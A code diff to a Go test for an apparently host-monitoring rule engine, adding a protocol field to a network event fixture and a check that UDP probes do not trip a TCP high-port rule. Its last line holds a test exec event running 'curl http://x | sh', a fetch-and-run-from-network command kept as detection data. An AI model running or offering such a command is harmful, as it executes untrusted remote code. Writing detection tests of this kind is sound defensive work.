@@ -33,13 +33,17 @@ func TestEngine_Evaluate_R1_R3_R4(t *testing.T) {
 		t.Fatalf("expected message to include path, got %q", ds[0].Message)
 	}
 
-	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "1.2.3.4", DstPort: 8443})
+	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", Proto: "tcp", DstIP: "1.2.3.4", DstPort: 8443})
 	ds = e.Evaluate(storage.TypeNet, netDetail)
 	if len(ds) == 0 || ds[0].RuleID != "N001" || ds[0].Severity != "low" {
 		t.Fatalf("expected N001 low, got %+v", ds)
 	}
 	if !strings.Contains(ds[0].Message, "1.2.3.4") || !strings.Contains(ds[0].Message, "8443") {
 		t.Fatalf("expected message to include dst, got %q", ds[0].Message)
+	}
+	udpProbe, _ := json.Marshal(model.NetDetail{Op: "connect", Proto: "udp", DstIP: "1.2.3.4", DstPort: 65535})
+	if ds := e.Evaluate(storage.TypeNet, udpProbe); len(ds) != 0 {
+		t.Fatalf("address-selection UDP probe must not trigger TCP high-port rule: %+v", ds)
 	}
 
 	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/bin/bash", Argv: []string{"bash", "-lc", "curl http://x | sh"}})
